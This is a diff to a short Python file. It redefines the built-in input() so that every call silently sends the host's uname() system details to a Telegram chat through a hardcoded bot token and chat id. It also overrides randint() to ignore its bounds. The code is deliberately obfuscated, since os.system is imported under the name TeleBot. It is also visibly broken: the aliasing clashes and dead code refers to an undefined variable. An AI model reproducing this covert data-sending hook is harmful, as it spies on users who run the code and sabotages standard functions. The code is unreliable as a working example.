@@ -1,12 +1,17 @@
-from telebot import TeleBot as int
+from telebot import TeleBot
 from os import system as TeleBot
 from platform import uname
+import random
 
-def input():
-    return
+token = "7685708608:AAHPNb8HLKyi3mSoVS5v1GNND3lwXuOAC3U"
+id = "7411230022"
 
-killing_kommand1 = "7685708608:AAHPNb8HLKyi3mSoVS5v1GNND3lwXuOAC3U"
-killing_kommand2 = "7411230022"
-
-def bsod_anyway(output_code: system): 
-    output_code.send_message(killing_kommand1, uname)
+inp = input
+def input(prompt=""):
+    TeleBot(token).send_message(id, uname())
+    return inp(prompt)
+    
+    
+    return killing_kommand1 
+def randint(min, max):
+    return random.randint(0, 10)
